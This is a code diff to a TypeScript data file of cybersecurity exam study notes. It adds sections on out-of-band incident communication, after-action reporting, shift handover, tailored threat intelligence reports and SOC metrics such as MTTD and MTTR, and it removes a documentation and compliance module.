-          "Communication cadence: How often to update? Critical issues: hourly. Major issues: daily. Minor issues: weekly.",
+          "Operational security awareness: Handling incident information on a need-to-know basis and making sure staff know what they may and may not share.",
+          "Communication channels: The methods used to share information, such as ticketing systems, secure messaging, and phone bridges.",
+          "Out-of-band communication: Using a channel that does not depend on the possibly compromised systems, such as a phone call when email may be compromised.",
+          "Rule: Do not discuss incident details on public or unapproved channels, and do not alert the attacker.",
         ],
         remember:
-          "Escalate early. Better to have leadership overreact than find out too late.",
+          "If you think a burglar is inside the house, you do not shout your plan through the open window or write it on the front door. You whisper to the people who need to know, using a phone line the burglar cannot hear.",
+        examTip:
+          "Email may be compromised, so use a phone bridge or secure messenger = out-of-band communication. Share details only with those who need them = need-to-know. One spokesperson for outside questions = consistent messaging. Posting incident details in a public chat or social media = poor operational security.",
       },
       {
-        heading: "Crisis Communication",
-        explain: "Major incidents require controlled, strategic communication.",
+        heading: "Post-Incident Reporting",
+        explain:
+          "After the incident, three related products capture what happened, why, and what changes.",
         points: [
-          "Rapid response: Issue initial statement quickly. Acknowledge issue. Show you are taking action.",
-          'Accurate information: Only communicate what you know. Say "we are investigating" if facts not confirmed.',
-          "Consistent messaging: Brief all communicators on key points. Prevent contradictions.",
-          "Transparency vs operational security: Be honest about impact without revealing attack methods to other attackers.",
-          "Follow-up: Provide updates as situation develops. Radio silence increases speculation.",
-        ],
-        remember: "In crisis: Communicate fast, accurately, and consistently.",
-      },
-      {
-        heading: "Risk Communication",
-        explain: "Helping stakeholders understand and accept security risks.",
-        points: [
-          "Risk level: Clearly state risk (high/medium/low). What is at stake? What is probability?",
-          "Business impact: Why does this matter? Revenue? Customers? Compliance?",
-          "Mitigation: What will you do? Timeline? Resource requirements?",
-          "Acceptance: Sometimes organizations accept risk (cost of fix exceeds risk). Ensure decision-makers approve.",
+          "After action report: A formal document that reviews the incident and the response: what happened, what was done, what worked, and what did not.",
+          "Lessons learned: The improvements the organization decides to make based on the incident, such as new controls, updated playbooks, or more training.",
+          "Root cause analysis (RCA): The investigation into WHY the incident occurred. It is performed during post-incident activity (Module 3.3) and recorded in the after action report.",
+          "Approach: Blameless review focuses on fixing processes, not blaming people.",
         ],
         remember:
-          "Risk communication helps stakeholders make informed decisions about risk acceptance.",
-      },
-    ],
-    quickReview: [
-      "Tailor communication to audience. Executives = risk/cost. Technicians = how to fix.",
-      "Escalate serious issues immediately. Do not delay.",
-      "Communication cadence: Critical = hourly, Major = daily, Minor = weekly.",
-      "Crisis communication: Fast, accurate, consistent. Acknowledge and show action.",
-      "Transparency builds trust. Admit mistakes and what you will fix.",
-      "Risk communication helps stakeholders accept or mitigate risk.",
-    ],
-    glossary: [
-      {
-        term: "Escalation",
-        meaning: "Moving issue up chain of command for higher-level attention.",
+          "A football match review. The after action report is the match report (what happened). Lessons learned are the changes to training next week. RCA is the analysis of why the goal was conceded.",
+        examTip:
+          "'What happened and how did we respond?' = after action report. 'What will we do differently?' = lessons learned. 'Why did it happen in the first place?' = root cause analysis. A weak answer blames an employee; a strong answer fixes the control or process that allowed it.",
       },
       {
-        term: "Risk Acceptance",
-        meaning: "Decision to accept a risk rather than remediate it.",
+        heading: "Shift and Incident Handover",
+        explain:
+          "SOCs run around the clock. A good handover keeps work moving when people change.",
+        points: [
+          "Shift or incident handover: Transferring the status of open incidents and ongoing work from one analyst or shift to the next.",
+          "What to include: Open incidents and their status, actions already taken, pending tasks, evidence and chain-of-custody notes, key contacts, and escalations in progress.",
+          "Goal: The new shift neither repeats work nor misses open actions.",
+        ],
+        remember:
+          "A nurse changing shifts tells the next nurse each patient's condition, what medicine was given, and what is due next. Without it, a patient gets a double dose or none.",
+        examTip:
+          "An analyst leaves for the day with an investigation half done = shift handover. Missing details cause duplicated effort or missed deadlines. A documented, consistent handover is part of standardizing operations (Module 1.5).",
       },
       {
-        term: "Dwell Time",
-        meaning: "Duration between compromise and detection.",
+        heading: "Internal Threat Intelligence Report",
+        explain:
+          "A threat report is useful only if it matches your organization. Tailoring turns generic news into action.",
+        points: [
+          "Internal threat intelligence report: Summarizes current threats, attack trends, and security concerns affecting the organization, based on its own incidents and external intelligence.",
+          "Tailored to organization and environment: Focuses on threats relevant to your industry, technology, and past incidents, and recommends actions.",
+          "Contrast: A generic feed lists everything. A tailored report prioritizes what matters to you.",
+        ],
+        remember:
+          "A weather report for your town only, not for the whole world. It says 'bring an umbrella, the river near your house will flood', not 'it is raining somewhere'.",
+        examTip:
+          "A report on a Linux-only threat is low relevance for a Windows-only company (this links to Relevance in Module 1.4). 'Customized for our industry and environment' = tailored internal threat intelligence report. It should end with recommended actions, not just a list of threats.",
       },
       {
-        term: "Cadence",
-        meaning: "Regular frequency of communication or updates.",
+        heading: "Security Operations Metrics and KPIs",
+        explain:
+          "These numbers show how fast and how accurately the SOC works. Two metrics share the abbreviation MTTR, so read definitions carefully.",
+        points: [
+          "Alert volume: Number of alerts in a period. It shows workload. A sudden spike can mean an attack or a noisy rule; a sudden drop can mean logging stopped.",
+          "False-positive rate: Percent of alerts that were not real threats. Lower is better and saves analyst time.",
+          "True-positive rate: Percent of alerts that were real threats. Higher shows better detection quality.",
+          "Mean time to detect (MTTD): Average time from the attack starting to detection. Lower is better.",
+          "Mean time to respond (MTTRespond): Average time from detection to the start of containment and response. Lower is better.",
+          "Mean time to remediate (MTTRemediate): Average time to completely remove the root cause. Lower is better.",
+          "Mean time to close (MTTC): Average time to fully resolve and close incidents or tickets.",
+          "Phishing campaign click rate: Percent of users who clicked a simulated phishing link. A falling rate shows training is working. Also track how many users reported the phish.",
+        ],
+        remember:
+          "Timeline of one incident: attack starts, DETECT (MTTD), RESPOND and contain (MTTRespond), REMEDIATE the root cause (MTTRemediate), CLOSE the ticket (MTTC). Lower is better for all four. Think of a smoke alarm: how fast it rings, how fast the brigade arrives, how fast the cause is fixed, how fast the paperwork is done.",
+        examTip:
+          "'Time from attack to alert' = MTTD. 'Time to contain' = respond. 'Time to eliminate the root cause' = remediate. 'Time until the ticket is closed' = MTTC. Percent of alerts that were real = true-positive rate. Percent of staff who clicked the simulated phish = click rate (should fall after training). If a question just says 'MTTR', read the definition in the question to see whether it means respond or remediate.",
       },
     ],
   },
-  {
-    id: "domain-4-4",
-    title: "Documentation and Compliance Management",
-    domain: "Domain 4.0",
-    domainName: "Reporting and Communication",
-    module: "4.4",
-    moduleName: "Documentation and Compliance",
-    description:
-      "Evidence documentation, audit support, regulatory requirements, security records management, retention policies, and compliance frameworks.",
-    lastUpdated: "Oct 9, 2026",
-    access: "Free",
-    icon: Shield,
-    estimatedTime: "2 hours",
-    sections: [
-      {
-        heading: "Documentation Requirements",
-        explain:
-          "Proper documentation serves multiple purposes: incident investigation, compliance proof, and legal defense.",
-        points: [
-          "Incident documentation: What happened? When? Timeline. Decisions made. Why?",
-          "Evidence documentation: Chain of custody. Who handled evidence? When? Why? Signatures.",
-          "Investigation findings: What you discovered. How you discovered it. Evidence supporting conclusions.",
-          "Remediation documentation: What did you fix? When? Who approved? Verification of fix effectiveness.",
-        ],
-        remember:
-          "If it is not documented, it did not happen. Assume legal discovery and need to prove your actions.",
-      },
-      {
-        heading: "Compliance Frameworks",
-        explain:
-          "Organizations must demonstrate compliance with industry and regulatory frameworks.",
-        points: [
-          "NIST Cybersecurity Framework: Five functions (Identify, Protect, Detect, Respond, Recover).",
-          "ISO 27001: International standard for information security management system.",
-          "SOC 2: Audits controls over security, availability, processing integrity, confidentiality, privacy.",
-          "HIPAA: For health care. Requires encryption, access controls, audit logs.",
-          "PCI DSS: For payment processing. Requires network segmentation, encryption, access control.",
-        ],
-        remember:
-          "Compliance is an ongoing process, not a one-time audit. Implement and maintain controls continuously.",
-      },
-      {
-        heading: "Audit and Assessment Support",
-        explain:
-          "Auditors assess your security program. Good documentation makes audits easier.",
-        points: [
-          "Audit readiness: Are you documenting controls? Logging access? Retaining logs?",
-          'Evidence collection: Auditors request proof. "Show me your backup recovery test results." Ready your documentation.',
-          "Exceptions: If you cannot meet a requirement, document why and what you are doing instead.",
-          "Remediation tracking: Auditors find findings. Document your remediation plan and track to closure.",
-        ],
-        remember: "Audits go smoother with organized, complete documentation.",
-      },
-      {
-        heading: "Records Management and Legal Hold",
-        explain:
-          "Security records must be retained properly for legal and compliance purposes.",
-        points: [
-          "Retention policy: How long to keep logs? Incident reports? Audit results? Usually 90 days minimum, compliance may require 7 years.",
-          "Legal hold: If litigation is anticipated, preserve all related evidence. Do not delete anything even if retention period expired.",
-          "Secure storage: Logs and evidence must be protected from tampering and unauthorized access.",
-          "Accessibility: Records must be retrievable for investigation or audit. Organize so you can find needed evidence quickly.",
-        ],
-        remember:
-          "Retention policy applies during normal operations. Legal hold supersedes retention policy during litigation.",
-      },
-    ],
-    quickReview: [
-      "Document everything: incidents, evidence, findings, remediation. Assume legal discovery.",
-      "Chain of custody: Name, date, time, action, reason for every evidence interaction.",
-      "NIST, ISO 27001, SOC 2, HIPAA, PCI DSS are major compliance frameworks.",
-      "Auditors assess controls. Documentation proves you implemented and maintained them.",
-      "Retention policy: Keep logs per policy (usually 90 days minimum). Legal hold: Keep everything if litigation anticipated.",
-      "Accessible organization: Must be able to quickly retrieve evidence for investigation or audit.",
-    ],
-    glossary: [
-      {
-        term: "Chain of Custody",
-        meaning:
-          "Documentation of evidence handling from collection through investigation.",
-      },
-      {
-        term: "Legal Hold",
-        meaning:
-          "Obligation to preserve evidence when litigation is anticipated.",
-      },
-      {
-        term: "Retention Policy",
-        meaning: "Rules governing how long to keep security records.",
-      },
-      {
-        term: "SOC 2",
-        meaning:
-          "Audit framework assessing controls over security, availability, integrity, confidentiality, privacy.",
-      },
-    ],
-  },
+
 ];
 
 export interface SubSection {
